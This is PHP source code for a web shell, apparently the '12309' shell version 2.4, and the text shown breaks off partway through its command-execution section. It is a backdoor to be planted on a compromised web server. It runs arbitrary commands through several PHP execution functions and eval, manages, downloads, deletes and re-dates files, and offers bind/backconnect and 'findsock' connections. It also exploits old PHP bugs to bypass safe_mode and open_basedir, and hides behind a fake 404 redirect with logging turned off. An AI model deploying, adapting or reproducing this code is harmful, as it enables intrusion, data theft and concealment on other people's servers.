<?php
//th1s 1s ultr4l33t php websh3ll || uz3 1t f0r 3duc4t10n4l purp0zes 0nly :P
if(isset($_GET['pfs'])) {
 if(empty($_GET['path'])) {
  $path="./";
 } else {
  $path=$_GET['path'];
 }
 findsock($path);
}
@session_start();
if(isset($_REQUEST['l0g1n'])) {
 $_SESSION['l0g1n']=session_id();;
}
if(!isset($_SESSION['l0g1n'])) {
 header("Location: http://".$_SERVER['SERVER_NAME']."/404.html");
}
$ver="2.4";
// --------------------------------------------- globals 
@ini_set('display_errors',0);
@ini_set('log_errors',0);
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('max_execution_time',0);
$pageend='</body></html>';
$htaccesses=array('cgi' => "Options +Indexes +FollowSymLinks +ExecCGI\nAddType application/x-httpd-cgi .pl .py", 'ssi' => "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml\nAddOutputFilter INCLUDES .shtml");
if($_POST['action']!="") {
 $_SESSION['action']=$_POST['action'];
 $action=$_SESSION['action'];
} else {
 $action="viewer";
}
// download file or command execution result
if($action=="download" or $_POST["down"]=="on") {
 $download="1";
}
if ($download == "1") {
 if (isset($_POST["file"])) {
  header('Content-Length:'.filesize($_POST["file"]).'');
 }
 header("Content-Type: application/force-download");
 header("Content-Type: application/octet-stream");
 header("Accept-Ranges: bytes");
 if (isset($_POST["filename"])) {
  header('Content-Disposition: attachment; filename="'.$_POST["filename"].'"');
 } elseif (isset($_POST["file"])) {
  header('Content-Disposition: attachment; filename="'.$_POST["file"].'"');
 } else {
  header('Content-Disposition: attachment; filename="result.txt"');
 }
}
@set_magic_quotes_runtime(0);
@ini_set("magic_quotes_runtime", 0);
// slashes fix by r00nix
if (get_magic_quotes_gpc()) {
 function stripslashes_deep($value) {
  $value = is_array($value) ?
   array_map('stripslashes_deep', $value) :
   stripslashes($value);
  return $value;
 }
 $_POST = array_map('stripslashes_deep', $_POST);
 $_GET = array_map('stripslashes_deep', $_GET);
 $_COOKIE = array_map('stripslashes_deep', $_COOKIE);
 $_REQUEST = array_map('stripslashes_deep', $_REQUEST);
}
$descriptorspec = array(
 0 => array("pipe", "r"),
 1 => array("pipe", "w"),
 2 => array("pipe", "w")
);
$helpscript='function showTooltip(id)
{
 var myDiv = document.getElementById(id);
 if(myDiv.style.display == "none"){
  myDiv.style.display = "block";
 } else {
  myDiv.style.display = "none";
 }
 return false;
}';
$resizescript='function changeSize(elem){
 if(event.keyCode==13){
  elem.rows = elem.rows+1;
 }
 var oldrows = getrows(elem);
 var myTxtAreaSize = elem.value.length;
 var newrows = (myTxtAreaSize / 80 | 0)+1;
 if(newrows>oldrows){
  elem.rows = newrows;
 } else {
  elem.rows = oldrows;
 }
}
function getrows(elem){
 var text = elem.value.replace(/\s+$/g, "\n");
 var aNewlines = text.split("\n");
 var iNewlineCount = aNewlines.length;
 return iNewlineCount;
}';
$design='function cleard() {
 document.cookie="d=c; path=/;";
 window.location.reload();
}
function blackd() {
 document.cookie="d=b; path=/;";
 window.location.reload();
}';
if ($_COOKIE['d'] != "c") {
 $style='<style type="text/css">
 a {
  color: yellow;
  text-decoration: none;
  text-shadow: black 0px 0px 4px;
 }
 input {
  background-color: #303030;
  color: #73ba25; /* guess why */
  border: none;
 }
 textarea {
  background-color: #303030; 
  color: #73ba25;
  border: none;
 }
 input[type="submit"] {
  background-color: gray;
  color: white;
 }
 select {
  background-color: black; 
  color: yellow;
 }
 body {
  background-color: black;
  color: white; 
 }
 </style>';
} else {
 $style='';
}
if ($_COOKIE['d'] == "c") {
 $button='<input type="button" value="black style" onclick="blackd()"></span><br><br>';
 } else {
 $button='<input type="button" value="clear style" onclick="cleard()"></span><br><br>';
}
$title='<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- made by 12309 || cheerz to Tidus, Shift, pekayoba, Zer0, ForeverFree, r00nix and all people whose code i borrowed || exploit.in f0r3v4 -->
<html>
 <head>
  <title>12309 '.$ver.'</title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">'.$style.'</head><body><script type="text/javascript">'.$helpscript.''.$resizescript.''.$design.'</script><span style="float:left;"><form name="page" method="post" action="'.$_SERVER["PHP_SELF"].'"><input name="p" type="hidden" value=""></form><b><a href="#" onclick=\'document.page.p.value="f";document.page.submit();\'>file operations</a></b> || <b><a href="#" onclick=\'document.page.p.value="s";document.page.submit();\'>execute command</a></b> || <b><a href="#" onclick=\'document.page.p.value="b";document.page.submit();\'>bind/backconnect</a></b> || <b><a href="#" onclick=\'document.page.p.value="e";document.page.submit();\'>extras</a></b></span><span style="float: right;">'.$button.'';
// --------------------------------------------- symbolic permissions 
function fperms($file,$request) {
 $perms = fileperms($file);
 if (($perms & 0xC000) == 0xC000) {$info = 's';}
 elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} 
 elseif (($perms & 0x8000) == 0x8000) {$info = '-';}
 elseif (($perms & 0x6000) == 0x6000) {$info = 'b';}
 elseif (($perms & 0x4000) == 0x4000) {$info = 'd';}
 elseif (($perms & 0x2000) == 0x2000) {$info = 'c';}
 elseif (($perms & 0x1000) == 0x1000) {$info = 'p';}
 else {$info = '?';}
 if ($request == "string") {
  $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-');$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
  return $info;
 } elseif ($request == "array") {
  $o["r"] = ($perms & 00400) > 0; $o["w"] = ($perms & 00200) > 0; $o["x"] = ($perms & 00100) > 0;
  $g["r"] = ($perms & 00040) > 0; $g["w"] = ($perms & 00020) > 0; $g["x"] = ($perms & 00010) > 0;
  $w["r"] = ($perms & 00004) > 0; $w["w"] = ($perms & 00002) > 0; $w["x"] = ($perms & 00001) > 0;
  return array("t"=>$info,"o"=>$o,"g"=>$g,"w"=>$w);
 } else {
  return "request?";
 }
}
function view_perms_color($file) {
 if (!is_readable($file)) {
  return "<font color=red>".fperms($file,"string")."</font>";
 } elseif (!is_writable($file)) {
  return "<font color=white>".fperms($file,"string")."</font>";
 } else {
  return "<font color=green>".fperms($file,"string")."</font>";
 }
}
// --------------------------------------------- touch file
function touchz($file) {
 $form=TRUE;
 if (isset($_POST["touch_submit"])) {
  $date=explode(" ",$_POST["time"]);
  $day=explode("-",$date[0]);
  $time=explode(":",$date[1]);
  $unixtime=mktime($time[0],$time[1],$time[2],$day[1],$day[2],$day[0]);
  if (touch($file,$unixtime,$unixtime)) {
   $form = FALSE;
   echo "<br>touched ".$file." to ".$unixtime." (".$_POST["time"].") <a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$_POST["dir"]."'; document.reqs.submit();\">back</a><br><br>";
  } else {
   echo "<br>can't touch to ".$unixtime." (".$_POST["time"].")! <a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$_POST["dir"]."'; document.reqs.submit();\">back</a><br><br>";
  }
 }
 if ($form) {
  echo "<br><form action=\"".$_SERVER['PHP_SELF']."\" method=\"POST\">
  <input type=\"hidden\" name=\"p\" value=\"f\">
  <input type=\"hidden\" name=\"file\" value=\"".$file."\">
  <input type=\"hidden\" name=\"action\" value=\"touch\">
  <input type=\"hidden\" name=\"dir\" value=\"".$_POST["dir"]."\">
  touch ".$file." to: <input name=\"time\" type=\"text\" maxlength=\"19\" size=\"19\" value=\"".date("Y-m-d H:i:s",filemtime($file))."\">
  <tr><td><input type=\"submit\" name=\"touch_submit\" value=\"Touch\"></td></tr>
  </table></form>";
 }
 return TRUE;
}
// --------------------------------------------- chmod code from c99 shell, updated by 12309
function chmodz($file) {
 $check = fileperms($file);
 if (!$check) {echo "<b>chmod error: can`t get current value!</b>";}
 else {
  $form=TRUE;
  if (isset($_POST["chmod_submit"])) {
   $chmod_o=$_POST["chmod_o"];
   $chmod_g=$_POST["chmod_g"];
   $chmod_w=$_POST["chmod_w"];
   $octet=trim("0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8));
   if (chmod($file,octdec($octet))) {
    $form = FALSE; 
    echo "chmoded ".$file." to ".$octet."! <a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$_POST["dir"]."'; document.reqs.submit();\">back</a><br><br>";
   } else { 
    echo "can't chmod to ".$octet."! <a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$_POST["dir"]."'; document.reqs.submit();\">back</a><br><br>";
   }
  }
  if (isset($_POST["chmod_string"])) {
   if (chmod($file,octdec($_POST["string"]))) {
    $form = FALSE;
    echo "chmoded ".$file." to ".$_POST["string"]."! <a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$_POST["dir"]."'; document.reqs.submit();\">back</a><br><br>";
   } else { 
    echo "can't chmod to ".$_POST["string"]."! <a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$_POST["dir"]."'; document.reqs.submit();\">back</a><br><br>";
   }
  }
  if ($form) {
   $perms = fperms($file,"array");
   echo "<br>chmoding ".$file.": ".view_perms_color($file)." (".substr(decoct($check),-4,4).") owned by: <br>".owner($file)."<br>
   <br>input string: <form action=\"".$_SERVER['PHP_SELF']."\" method=\"POST\">
   <input type=\"hidden\" name=\"p\" value=\"f\">
   <input type=\"hidden\" name=\"file\" value=\"".$file."\">
   <input type=\"hidden\" name=\"action\" value=\"chmod\">
   <input type=\"hidden\" name=\"dir\" value=\"".$_POST["dir"]."\">
   <input type=\"text\" name=\"string\" maxlength=\"4\" size=\"4\" value=\"".substr(decoct($check),-4,4)."\">
   <input type=\"submit\" name=\"chmod_string\" value=\"Save\"></form>";
   echo "<br> or select checkboxes:<br><form action=\"".$_SERVER['PHP_SELF']."\" method=\"POST\">
   <input type=\"hidden\" name=\"p\" value=\"f\">
   <input type=\"hidden\" name=\"file\" value=\"".$file."\">
   <input type=\"hidden\" name=\"action\" value=\"chmod\">
   <input type=\"hidden\" name=\"dir\" value=\"".$_POST["dir"]."\">
   <table align=\"left\" width=\"300\" border=\"0\" cellspacing=\"0\" cellpadding=\"5\">
   <tr>
    <td><b>Owner</b><br>
     <input type=\"checkbox\" name=\"chmod_o[r]\" value=\"1\"".($perms["o"]["r"]?" checked":"")."> read<br>
     <input type=\"checkbox\" name=\"chmod_o[w]\" value=\"1\"".($perms["o"]["w"]?" checked":"")."> write<br>
     <input type=\"checkbox\" name=\"chmod_o[x]\" value=1".($perms["o"]["x"]?" checked":"")."> execute
    </td>
    <td><b>Group</b><br>
     <input type=\"checkbox\" name=\"chmod_g[r]\" value=\"1\"".($perms["g"]["r"]?" checked":"")."> read<br>
     <input type=\"checkbox\" name=\"chmod_g[w]\" value=\"1\"".($perms["g"]["w"]?" checked":"")."> write<br>
     <input type=\"checkbox\" name=\"chmod_g[x]\" value=\"1\"".($perms["g"]["x"]?" checked":"")."> execute
    </td>
    <td><b>World</b><br>
     <input type=\"checkbox\" name=\"chmod_w[r]\" value=\"1\"".($perms["w"]["r"]?" checked":"")."> read<br>
     <input type=\"checkbox\" name=\"chmod_w[w]\" value=\"1\"".($perms["w"]["w"]?" checked":"")."> write<br>
     <input type=\"checkbox\" name=\"chmod_w[x]\" value=\"1\"".($perms["w"]["x"]?" checked":"")."> execute
    </td>
   </tr>
   <tr><td><input type=\"submit\" name=\"chmod_submit\" value=\"Save\"></td></tr>
   </table></form>";
  }
 }
 return TRUE;
}
// --------------------------------------------- clearing phpversion() 
function version() {
 $pv=explode(".",phpversion());
 if(eregi("-",$pv[2])) {
  $tmp=explode("-",$pv[2]);
  $pv[2]=$tmp[0];
 }
 $php_version_sort=$pv[0].".".$pv[1].".".$pv[2];
 return $php_version_sort;
}
// --------------------------------------------- recursive dir removal by Endeveit
function rmrf($dir)
{
 if ($objs = glob($dir."/*")) {
  foreach($objs as $obj) {
   is_dir($obj) ? rmrf($obj) : unlink($obj);
  }
 }
 if (rmdir($dir)) {
  return TRUE;
 } else {
  return FALSE;
 }
}
// --------------------------------------------- checking for enabled funcs
function function_enabled($func) {
 $disabled=explode(",",@ini_get("disable_functions")); 
 if (empty($disabled)) { 
  $disabled=array(); 
 } 
 else {  
  $disabled=array_map('trim',array_map('strtolower',$disabled)); 
 } 
 return (function_exists($func) && is_callable($func) && !in_array($func,$disabled) ); 
}
if (!function_enabled('shell_exec') and !function_enabled('proc_open') and !function_enabled('passthru') and !function_enabled('system') and !function_enabled('exec') and !function_enabled('popen')) {
 $failflag="1";
} else {
 $failflag="0";
}
// -------------------------------------------- run command
function run($c) {
 if (function_enabled('shell_exec')) {
  shell_exec($c);
 } else if(function_enabled('system')) {
  system($c);
 } else if(function_enabled('passthru')) {
  passthru($c);
 } else if(function_enabled('exec')) {
  exec($c);
 } else if(function_enabled('popen')) {
  $fp=popen($c,'r');
  @pclose($fp);
 } else if(function_enabled('proc_open')) {
  $handle=proc_open($c,$GLOBALS["descriptorspec"],$pipes);
  while (!feof($pipes[1])) {
   $buffer.=fread($pipes[1],1024);
  }
  @proc_close($handle);
 }
}
// -------------------------------------------- php <= 5.2.9 curl bug
function sploent529($path) {
 if (!is_dir('file:')) {
  mkdir('file:');
 }
 $dirz=array();
 $a=array();
 $a=explode('/',$path);
 $c=count($a);
 $dir='file:/';
 $d=substr($dir,0,-1);
 if (!is_dir($d)) {
  mkdir($d); 
 }
 for ($i=0;$i<$c-1;++$i) {
  $dir.=$a[$i].'/';
  $d=substr($dir,0,-1);
  $dirz[]=$d;
  if (!is_dir($d)) {
   mkdir($d); 
  } 
 }
 if (!file_exists($path)) {
  $fp=fopen('file:/'.$path,'w');
  fclose($fp); 
 }
 $ch=curl_init();
 curl_setopt($ch,CURLOPT_URL,'file:file:////'.$path);
 curl_setopt($ch,CURLOPT_HEADER,0);
 if(FALSE==curl_exec($ch)) {
  echo ("    fail :( either there is no such file or exploit failed ");
  curl_close($ch);
  rmrf('file:');
  echo $pageend;
  die();
 } else {
  curl_close($ch);
  rmrf('file:');
  return TRUE;
 }
}
// --------------------------------------------- php 5.1.6 ini_set bug
function sploent516() {
 //safe_mode check
 if (ini_get("safe_mode") =="1" || ini_get("safe_mode") =="On" || ini_get("safe_mode") ==TRUE) {
  ini_restore("safe_mode");
  if (ini_get("safe_mode") =="1" || ini_get("safe_mode") =="On" || ini_get("safe_mode") ==TRUE) {
   ini_set("safe_mode", FALSE);
   ini_set("safe_mode", "Off");
   ini_set("safe_mode", "0");
   if (ini_get("safe_mode") =="1" || ini_get("safe_mode") =="On" || ini_get("safe_mode") ==TRUE) {
    echo "<font color=\"red\">safe mode: ON</font><br>";
   } else {
    echo "<font color=\"green\">safe mode: OFF</font> || hello php-5.1.6 bugs<br>";
   }
  } else {
   echo "<font color=\"green\">safe mode: OFF</font> || hello php-5.1.6 bugs<br>";
  }
 } else {
  echo "<font color=\"green\">safe mode: OFF</font><br>";
 }
 //open_basedir check
 if (ini_get("open_basedir")=="Off" || ini_get("open_basedir")=="/" || ini_get("open_basedir")==NULL || strtolower(ini_get("open_basedir"))=="none") {
  echo "open_basedir: none<br>";
 } 
 else {
  ini_restore("open_basedir");
  if (ini_get("open_basedir")=="Off" || ini_get("open_basedir")=="/" || ini_get("open_basedir")==NULL ||  strtolower(ini_get("open_basedir"))=="none") {
   echo "open_basedir: none || hello php-5.1.6 bugs<br>";
  } 
  else {
   ini_set('open_basedir', '/'); 
   if (ini_get("open_basedir")=="/") {
    echo "open_basedir: / || hello php-5.1.6 bugs<br>";
   } 
   else {
    $basedir=TRUE;
   echo "open_basedir: ".ini_get("open_basedir");
   }
  }
 }
}
// --------------------------------------------- findsock
function findsock($path) {
 $VERSION = "1.0";
 echo "findsock start\n  ";
 $c="".$path." ".$_SERVER['REMOTE_ADDR']." ".$_SERVER['REMOTE_PORT']."";
 run($c);
 echo "  exiting\n";
 exit();
}
// --------------------------------------------- search for binary
function search($bin,$flag) {
 if ($flag=="1") { 
  $path="";
  return $path;
 } else {
  if (function_enabled('shell_exec')) {
   $path=trim(shell_exec('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in'));
  } else if(function_enabled('exec')) {
   $path=trim(exec('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in'));
  } else if(function_enabled('system')) {
   ob_start();
   system('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in');
   $path=trim(ob_get_contents());
   ob_end_clean();
  } else if (function_enabled('popen')) { 
   $hndl=popen('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in', "r");
   $path=trim(stream_get_contents($hndl));
   pclose($hndl);
  } else if(function_enabled('passthru')) {
   ob_start();
   passthru('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in');
   $path=trim(ob_get_contents());
   ob_end_clean();
  } else if(function_enabled('proc_open')) {
  $c='export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin && which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in';
  $process = proc_open('/bin/sh', $GLOBALS["descriptorspec"], $pipes);
  if (is_resource($process)) {
   fwrite($pipes[0],$c);
   fclose($pipes[0]);
   $path=trim(stream_get_contents($pipes[1]));
   fclose($pipes[1]);
   fclose($pipes[2]);
   @proc_close($process);
   }
  }
 }
 return $path;
}
// --------------------------------------------- filemanager code by Grinay, updated by 12309
function owner($path) {
 $user=fileowner($path);
 $group=filegroup($path);
 $data=$user;
 if(function_enabled('posix_getpwuid')) {
  $u=posix_getpwuid($user);
  $data.=" (".$u["name"].")";
 }
 $data.=" <br> ".$group;
 if(function_enabled('posix_getgrgid')) {
  $g=posix_getgrgid($group);
  $data.=" (".$g["name"].")&nbsp;";
 }
 return $data;
}
function view_size($size) {
 if ($size>=1073741824) { $size=@round($size/1073741824*100)/100 ." GB"; }
 elseif ($size>=1048576) { $size=$size." B<br>".@round($size/1048576*100)/100 ." MB"; }
 elseif ($size>=1024) { $size=$size." B<br>".@round($size/1024*100)/100 ." KB"; }
 else { $size=$size ." B"; }
 return $size;
}
function dirsize($path) { 
 $totalsize=0; 
 if ($handle=opendir($path)) { 
  while (false !== ($file = readdir($handle)))  { 
   $nextpath=$path . '/' . $file; 
   if ($file!='.' && $file != '..' && !is_link ($nextpath)) { 
    if (is_dir($nextpath)) { 
     $result=dirsize($nextpath); 
     $totalsize+=$result['size']; 
    } elseif (is_file($nextpath)) { 
     $totalsize+=filesize($nextpath); 
    } 
   } 
  } 
 } 
 closedir ($handle); 
 return $totalsize; 
}
function scandire($dir) {
 if (empty($dir)) { $dir=getcwd(); }
 $dir=chdir($dir) or die('<font color="red">cannot chdir!</font> open_basedir/safe_mode on?<br><br>'.$pageend.'');
 $dir=getcwd()."/";
 $dir=str_replace("\\","/",$dir);
 if (is_dir($dir)) {
  if ($dh = opendir($dir)) {
   while (($file = readdir($dh)) !== false) {
    if(filetype($dir.$file)=="dir") $dire[]=$file;
    if(filetype($dir.$file)=="file" || filetype($dir.$file)=="link" || filetype($dir.$file)=="socket") $files[]=$file;
   // if(filetype($dir.$file)=="") $files[]=$file; //debug: strange behavior of filetype() with openbasedir, it returns ""
   // if(filetype($dir.$file)=="link") $files[]=$file;
   // echo "file = ".$file." (".filetype($file).")<br>"; #debug
   // if (is_link($file)) { echo " -&gt ".readlink($file); }; #debug
   }
   closedir($dh);
   @sort($dire);
   @sort($files);
   echo "<table border>";
   echo '<tr><td><form method="post" action="'.$_SERVER['PHP_SELF'].'"><input name="p" type="hidden" value="f">go to dir:<input type="text" name="dir" value="'.$dir.'" size="30"><input name="action" type="hidden" value="viewer"><input type="submit" value="Go"></form></td></tr>';
   echo "<tr><td>Name</td><td>Type</td><td>Size</td><td>Inode Changed<br>File Modified<br>File Accessed</td><td>Owner<br>Group</td><td>Chmod</td><td>Action</td></tr>";
   for($i=0;$i<count($dire);$i++) {
    $link=$dir.$dire[$i];
    echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$link.'\'; document.reqs.submit();">'.$dire[$i].'<a/></td><td>Dir</td><td>'.view_size(dirsize($link)).'</td><td><font size="-1">'.date("d/m/Y H:i:s",filectime($link)).'<br>'.date("d/m/Y H:i:s",filemtime($link)).'<br>'.date("d/m/Y H:i:s",fileatime($link)).'</font></td><td>'.owner($link).'</td><td>'.substr(sprintf('%o',fileperms($link)), -4).' <br>('.view_perms_color($link,"string").')</td><td><a href="#" onclick="document.reqs.action.value=\'deletedir\'; document.reqs.dir.value=\''.$dir.'\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Delete">x</a> <a href="#" onclick="document.reqs.action.value=\'chmod\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Chmod">C</a> <a href="#" onclick="document.reqs.action.value=\'touch\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Touch">T</a></td></tr>';
   }
   for($i=0;$i<count($files);$i++) {
    $linkfile=$dir.$files[$i];
    echo '<tr><td><a href="#" onclick="document.editor.filee.value=\''.$linkfile.'\'; document.editor.files.value=\''.$linkfile.'\'; document.editor.submit();">'.$files[$i].'</a>';
    echo '<br></td><td>File</td><td>'.view_size(filesize($linkfile)).'</td><td><font size="-1">'.date("d/m/Y H:i:s",filectime($linkfile)).'<br>'.date("d/m/Y H:i:s",filemtime($linkfile)).'<br>'.date("d/m/Y H:i:s",fileatime($linkfile)).'</font></td><td>'.owner($linkfile).'</td><td>'.substr(sprintf('%o',fileperms($linkfile)), -4).' <br>('.view_perms_color($linkfile,"string").')</td><td> <a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Download">D</a> <a href="#" onclick="document.editor.filee.value=\''.$linkfile.'\'; document.editor.files.value=\''.$linkfile.'\'; document.editor.submit();" title="Edit">E</a> <a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Delete">x</a> <a href="#" onclick="document.reqs.action.value=\'chmod\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Chmod">C</a> <a href="#" onclick="document.reqs.action.value=\'touch\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Touch">T</a></td></tr></tr>'; 
   }
   echo "</table>";
  }
 }
}
// --------------------------------------------- crypt functions by Eugen
function entityenc($str) {
 $text_array=explode("\r\n", chunk_split($str, 1));
 for ($n=0; $n < count($text_array) - 1; $n++) {
  $newstring .= "&#" . ord($text_array[$n]) . ";";
 }
 return $newstring;
}
function entitydec($str) {
 $str=str_replace(';', '; ', $str);
 $text_array=explode(' ', $str);
 for ($n=0; $n < count($text_array) - 1; $n++) {
  $newstring .= chr(substr($text_array[$n], 2, 3));
 }
 return $newstring;
}
function asc2hex($str) {
 return chunk_split(bin2hex($str), 2, " ");
}
function hex2asc($str) {
 $str=str_replace(" ", "", $str);
 for ($n=0; $n<strlen($str); $n+=2) {
  $newstring .=  pack("C", hexdec(substr($str, $n, 2)));
 }
 return $newstring;
}
// --------------------------------------------- crypt functions by smartman
$itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
function to64as($input,$count) {
 global $itoa64;
 $output = '';
 $i = 0;
 while ($i < $count) {
  $value = ord($input[$i]);
  ++$i;
  $output .= $itoa64{$value & 0x3f};
  if ($i < $count) $value |= (ord($input[$i]) << 8);
  $output .= $itoa64{($value>>6) & 0x3f};
  ++$i;
  if ($i >= $count) break;
  if ($i < $count) $value |= (ord($input[$i]) << 16);
  $output .= $itoa64{($value>>12) & 0x3f};
  ++$i;
  if ($i >= $count) break;
  $output .= $itoa64{($value>>18) & 0x3f};
 }
 return $output;
}
function to64na($value,$num) {
 global $itoa64;
 $output = '';
 while ($num-1 >= 0) {
  --$num;
  $output .= $itoa64{$value & 0x3f};
  $value >>= 6;
 }
 return $output;
}
function unap($pwd,$salt,$magic='$1$') {
 if (substr($salt,0,strlen($magic)) == $magic) $salt = substr($salt,strlen($magic));
 $salt = explode('$',$salt,1);
 $salt = substr($salt[0],0,8);
 $ctx = $pwd.$magic.$salt;
 $final = md5($pwd.$salt.$pwd,true);
 for ($pl=strlen($pwd);$pl>=0;$pl-=16) {
  $ctx .= substr($final,0,($pl>16?16:$pl));
 }
 $i = strlen($pwd);
 while ($i) {
  $ctx .= ($i&1?chr(0):$pwd{0});
  $i >>= 1;
 }
 $final = md5($ctx,true);
 for ($i=0;$i<1000;++$i) {
  $ctx1 = '';
  $ctx1 .= ($i&1?$pwd:substr($final,0,16));
  if ($i % 3) $ctx1 .= $salt;
  if ($i % 7) $ctx1 .= $pwd;
  $ctx1 .= ($i&1?substr($final,0,16):$pwd);
  $final = md5($ctx1,true);
 }
 $passwd = '';
 $passwd .= to64na(((int)ord($final{0}) << 16)|((int)ord($final{6}) << 8)|((int)ord($final{12})),4);
 $passwd .= to64na(((int)ord($final{1}) << 16)|((int)ord($final{7}) << 8)|((int)ord($final{13})),4);
 $passwd .= to64na(((int)ord($final{2}) << 16)|((int)ord($final{8}) << 8)|((int)ord($final{14})),4);
 $passwd .= to64na(((int)ord($final{3}) << 16)|((int)ord($final{9}) << 8)|((int)ord($final{15})),4);
 $passwd .= to64na(((int)ord($final{4}) << 16)|((int)ord($final{10}) << 8)|((int)ord($final{5})),4);
 $passwd .= to64na(((int)ord($final{11})),2);
 return $magic.$salt.'$'.$passwd;
}
function phpass($pwd,$salt,$count,$prefix) {
 $hash = md5($salt.$pwd,true);
 for ($i=0;$i<$count;++$i) {
  $hash = md5($hash.$pwd,true);
 }
 return $prefix.substr($salt,0,8).to64as($hash,16);
}
function genSalt($salt,$length=8,$dot=0) {
 if (strlen($salt)>=$length) return substr($salt,0,$length);
 global $itoa64;
 if (!$dot) { $alphabet=substr($itoa64,2); } else { $alphabet=$itoa64; }
 $output='';
 for ($i=0;$i<$length;++$i) $output.=$alphabet{mt_rand(0,strlen($alphabet)-1)};
 return $output;
}
function mysql4($pwd) {
 $nr = 0x50305735;
 $nr2 = 0x12345671;
 $add = 7;
 $charArr = str_split($pwd);
 foreach ($charArr as $char) {
  if (in_array($char,array(' ','\n'))) continue;
  $charVal = ord($char);
  $nr ^= ((($nr & 63)+$add) * $charVal)+($nr << 8);
  $nr &= 0x7fffffff;
  $nr2 += ($nr2 << 8) ^ $nr;
  $nr2 &= 0x7fffffff;
  $add += $charVal;
 }
 return sprintf('%08x%08x',$nr,$nr2);
}
// --------------------------------------------- main code 
if (!isset($_REQUEST['p'])) { $_REQUEST['p']="s"; }
switch ($_REQUEST['p']) {
 case "s":
  if (empty($_POST["wut"]) and $download != "1") {
   echo $title;
   sploent516();
   if (ini_get("safe_mode")) {
    $failflag="1";
   }
   $shelltext=("uname -a");
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">
  <font color="green"> haxor@pwnedbox$ </font><textarea name="command" rows="1" cols="50" onkeyup="changeSize(this)">'.$shelltext.'</textarea> <input type="submit" value="go"> <input name="p" type="hidden" value="s"><input type="checkbox" name="down"> download <br><br>';
   if ($failflag=="1") {
    echo "all system functions are disabled :( <font color=\"gray\"> but you could try a CGI/SSI shell ;) and still there is<br></font>"; } else {
    if (function_enabled('passthru')) {
     echo 'passthru <input name="wut" value="passthru" type="radio" checked><br>';
    } else { echo 'passthru is disabled!<br>';}
    if (function_enabled('system')) {
     echo 'system <input name="wut" value="system" type="radio"><br>';
    } else { echo 'system is disabled!<br>';}
    if (function_enabled('exec')) {
     echo 'exec <input name="wut" value="exec" type="radio"><br>';
    } else { echo 'exec is disabled!<br>';}
    if (function_enabled('shell_exec')) {
     echo 'shell_exec <input name="wut" value="shell_exec" type="radio"><br>';
    } else { echo 'shell_exec is disabled!<br>';}
    if (function_enabled('popen')) {
     echo 'popen <input name="wut" value="popen" type="radio"><br>';
    } else { echo 'popen is disabled!<br>';}
    if (function_enabled('proc_open')) {
     echo 'proc_open <input name="wut" value="proc_open" type="radio"><br>';
    } else { echo 'proc_open is disabled!<br>';} 
   }
   // eval almost always enabled, except there is special option in suhosin-patched php 
   echo 'php eval() <input name="wut" value="eval" type="radio"><br>';
   echo '</form>';
   echo "<br>pcntl_exec:";
   //determining if pcntl enabled is kinda tricky. debug: add if(dl('pcntl.so')) or check var_dump(get_extension_funcs('pcntl')) ?
